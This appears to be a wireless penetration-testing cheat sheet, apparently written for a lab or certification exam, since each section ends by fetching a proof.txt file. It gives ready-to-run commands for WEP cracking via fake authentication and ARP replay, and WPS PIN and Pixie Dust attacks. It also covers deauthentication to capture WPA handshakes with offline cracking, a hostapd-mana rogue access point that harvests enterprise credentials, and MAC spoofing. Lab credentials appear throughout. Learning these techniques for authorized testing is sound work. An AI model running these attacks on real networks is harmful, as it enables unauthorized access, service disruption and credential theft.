
# Discover Network w/ Bruteforcing
```
mdk4 wlan0mon p -t <BSSID> -f <wordlist>
```

## Change Channel

- The interface has to be in monitor mode:

```
sudo iwconfig <interface_in_mointor_mode> channel <number>

sudo iw dev wlan0mon set channel 11
#or 
sudo iwconfig wlan0mon channel 11
```

# Change MAC Address
```
sudo airmon-ng stop wlan0mon
systemctl stop network-manager
ip link set wlan0 down
macchanger -m <new_mac_address> <interface>
ip link set wlan0 up
```


# WEP

## Setup Interface

```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```

## Capture packets with the `WEP` network info

```
sudo airodump-ng --band abg --manufacturer --wps wlan0mon
```

Targeted BSSID and Channel:

```
sudo airodump-ng --band abg --manufacturer --bssid <target-bssid> -c <target-channel> --wps -w wep wlan0mon
```

## Send fake authentication and ARPreplay attack

Fake Authentication:
```
sudo aireplay-ng -1 0 -a <target-bssid> -e "wifi-test" wlan0mon
```

Fake Authentication spoofed MAC (try one of the station MACs or another invented MAC):
```
sudo aireplay-ng -1 0 -a <target-bssid> -h 00:AA:AA:AA:AA -e "wifi-test" wlan0mon
```

ARP Replay to generate more traffic:
```
sudo aireplay-ng --arpreplay -b <target-bssid> -h 00:AA:AA:AA:AA <interface_in_mointor_mode>
```

> Note: The interface mac address you can use anything also you if you would like to spoof one

## Crack Key through IVs

```
sudo aircrack-ng wep-01.cap
```

## Connect to WEP Network

Now we can connect to the network using the recovered key:

```
sudo airmon-ng stop wlan0mon

nano wep.conf
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11BB33CD55
  wep_tx_keyidx=0
}

sudo wpa_supplicant -i wlan0 -c wep.conf

sudo dhclient wlan0 -v
```

Proof.txt
```
curl http://<ip>/proof.txt
```

# WPS

## Setup Interface

```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```

## Capture packets

List APs with WPS enabled
```
wash -i wlan0mon
wash -i -5 wlan0mon
```

```
sudo airodump-ng --band abg --manufacturer --wps wlan0mon

sudo airodump-ng --band abg --manufacturer --bssid AA:AA:AA:AA:AA -c 44 --wps wlan0mon
```

## Attack

Empty Password:
```
reaver -b <BSSID> -i wlan0mon -p ''
```


Default PINs (first 6 characters of BSSID):
```
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}

reaver -b <BSSID> -i wlan0mon -p '12345678'
```

Pixie Dust:
```
reaver -b <BSSID> -i wlan0mon -vv -K
```

Or
```
# Discover PIN and recover Passphrase
bully -b <BSSID> -i wlan0mon -v 4 -d
bully -b <BSSID> -i wlan0mon -B -p <PIN>
```

Brute Force:
```
reaver -b <BSSID> -i wlan0mon -vv
```

## Connect to Network

Check properties:
```
sudo airmon-ng stop wlan0mon

nano wpa.cong
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}

sudo wpa_supplicant -i wlan0 -c wpa.conf

sudo dhclient wlan0 -v
```

Proof.txt
```
curl http://<ip>/proof.txt
```

# WPA PSK


**Workflow**
1. **Capture handshake** with `airodump-ng`.
2. **Force client reconnect** with `aireplay-ng` (deauthentication).
3. **Crack PSK offline** with `aircrack-ng` using a wordlist.
4. **Verify key** with `airdecap-ng` or Wireshark.

After identifying the BSSID and channel, we begin capturing packets. Next, we force a deauthentication to trigger a client reconnection, which allows us to capture the 4-way handshake. Finally, we attempt to crack the handshake by testing candidate PSKs from a wordlist, deriving the corresponding PMK, and verifying the correct key to gain access to the network.


## Setup Interface

```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```


## Capture packets with the `WPA PSK` network info

```
sudo airodump-ng --band abg --manufacturer --wps wlan0mon
```

## Capture targeted packets

```
sudo airodump-ng --band abg --manufacturer --bssid F0:9F:C2:71:22:12 -c 6 -w psk wlan0mon
```

## Force client reconnect and capture handshake (do to different stations if need be):

- If client-specific deauth fails → try broadcast deauth (`0 1 -a <BSSID>` without `c`).
- If 802.11w (Protected Management Frames) is enabled → deauth won’t work → must wait for natural reconnect.

-c: client
-a: AP
```
sudo aireplay-ng -0 5 -c <station-bssid> -a <ap_bssid> wlan0mon
```

**Let it capture a bit more traffic so we can decrypt it later and check our key is correct!**

## Crack PSK

```
sudo aircrack-ng -w /usr/share/john/password.lst psk-01.cap
```

Generates a decrypted file!
## Verify Key

Using airdecap:

```
airdecap-ng -e wifi-mobile -p starwars1 psk-01.cap
```

## Connect to Network

Do not forget to check the variables like proto and ssid:
```
sudo airmon-ng stop wlan0mon

nano wpa.cong
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}

sudo wpa_supplicant -i wlan0 -c wpa.conf

sudo dhclient wlan0 -v
```

Proof.txt
```
curl http://<ip>/proof.txt
```


# WPA Enterprise

## Setup Interface

```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```


## Capture packets with the `WPA Enterprise` network info

```
sudo airodump-ng --band abg --manufacturer --wps wlan0mon
```

## Capture targeted packets

```
sudo airodump-ng --band abg --manufacturer --bssid <target-bssid> -c <target-channel> -w enterprise wlan0mon
```

## Force client reconnect and capture handshake (do to different stations if need be):
-c: client
-a: AP
```
sudo aireplay-ng -0 5 -c <station-bssid> -a <ap-bssid> wlan0mon
```

## After we get it we go through cap file and extract the `IDENTITY USER` and Certificates to setup Rouge AP


1. Filters for "eap". Read the Target Response and check the entity field.

2. Filters for "tls.handshake.certificate":

3. Extract both the CA Certificate and the Server certificate.

4. Check their props:

```
openssl x509 -inform der -in ca.der -text
openssl x509 -inform der -in server.der -text
```
## Setup Rogue AP

1. Edit files and change Certificate Authority and :

```
nano /etc/freeradius/3.0/certs/ca.cnf
nano /etc/freeradius/3.0/certs/server.cnf
```

2. After that we do the following commands under `/etc/freeradius/3.0/certs` to generate `Diffie Hellman key` for `hostapd-mana`

```
cd /etc/freeradius/3.0/certs
rm dh
make 
```

3. We create `EAP` user filename `mana.eap_user`

```
nano mana.eap_user
*	PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

4. After that we create a fake access point by creating a file called `network.conf` under any other directory

```
nano network.conf

ssid=wifi-corp
interface=wlan1
driver=nl80211

channel=44
hw_mode=a
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0

eap_user_file=/root/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key

private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh


auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP


wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/root/hostapd.credoutfile
mana_eapsuccess=1
mana_eaptls=1
```

5. **If using an interface in monitor mode, turn the interface to managed mode again**. Then use the following command to create fake `AP`

```
sudo hostapd-mana network.conf
```

10. Perform De-authentication attack (kick a specific client from the network to get the handshake), Using another interface:

```
sudo iw dev wlan0mon set channel 44
sudo aireplay-ng -0 4 -a F0:9F:C2:71:22:15 -c <client> wlan0mon
sudo aireplay-ng -0 4 -a F0:9F:C2:71:22:1A wlan0mon
```

> Note: Delete `-c` option if you want to do it in broadcast (Kick all clients)  
> You need to use another interface in monitor mode, Also you need to set the interface to the same channel as the target network before performing the De-authenticate attack, As the following:

> Tip: If there are 2 Enterprise network with the same name, You need to perform the De-authenticate attack on both of the networks.


## Crack Handshake

Then once you get handshake you will copy and paste command of asleep and adding -W /path/to/wordlist

```
asleap -C 3c:bb:53:07:80:12:1b:22 -R fa:91:54:7d:cb:6c:fd:79:e9:61:ef:3b:c7:42:89:1d:72:1e:71:c7:f5:49:1a:ba -W /usr/share/john/password.lst
```

## Connect to the Network

```
nano mtg.conf
network={
  ssid="wifi-corp"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="CONTOSO\juan.tr"
  password="bulldogs1234"
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}

sudo airmon-ng stop wlan0mon

sudo wpa_supplicant -i wlan0 -c mtg.conf

sudo dhclient wlan0 -v
```

Proof.txt
```
curl http://<ip>/proof.txt
```

# Open Network

## Setup Interface

```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```


## Monitor target

```
sudo airodump-ng --band abg --bssid F0:9F:C2:71:22:10 -c 6 wlan0mon
```


(Optional) If you cannot connect its possible you have to impersonate a client's MAC address:

```
sudo airmon-ng stop wlan0mon
systemctl stop network-manager
ip link set wlan0 down
macchanger -m 80:18:44:BF:72:47 <interface>
ip link set wlan0 up
```

## Connect to the Network

We know from earlier the correct AP:

```
sudo airmon-ng stop wlan0mon
```

As we have already discovered we want to connect to wifi-guest, the hidden AP:

```
nano guest.conf
network={
    ssid="wifi-guest"
    key_mgmt=NONE
    scan_ssid=1
}
```

Connect to the OPN network:

```
sudo wpa_supplicant -i wlan0 -c guest.conf

sudo wpa_supplicant -Dnl80211 -i wlan0 -c free.conf
```


Request IP Address in interface and login:

```
sudo dhclient wlan0 -v
```


Proof.txt
```
curl http://<ip>/proof.txt
```